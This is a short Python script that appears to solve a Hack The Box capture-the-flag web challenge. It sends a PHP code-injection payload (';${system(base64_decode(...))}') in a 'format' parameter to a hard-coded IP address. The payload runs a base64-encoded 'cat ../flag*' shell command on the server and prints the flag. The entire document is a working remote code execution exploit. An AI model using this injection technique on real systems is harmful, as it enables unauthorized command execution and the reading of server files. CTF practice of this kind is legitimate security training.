import requests
import base64

def SystemStr(b64: str):
	"""
	Payload to be used to extract the information
	"""
	return ';${system(base64_decode(%s))}' % (b64)

def Base64Str(str: str):
	"""
	Converts str to base64 string
	"""
	return base64.b64encode(str.encode('ascii')).decode('ascii')

url = "http://159.65.18.5:30773/"

# ls = Base64Str('ls ../') 		# used instead of `cat` to list the files and find the flag file
cat = Base64Str('cat ../flag*')

r = requests.get(url, {
	'format': SystemStr(cat)
})
for t in r.text.split('\n'):
	if ('HTB{' in t):
		print(t)
		break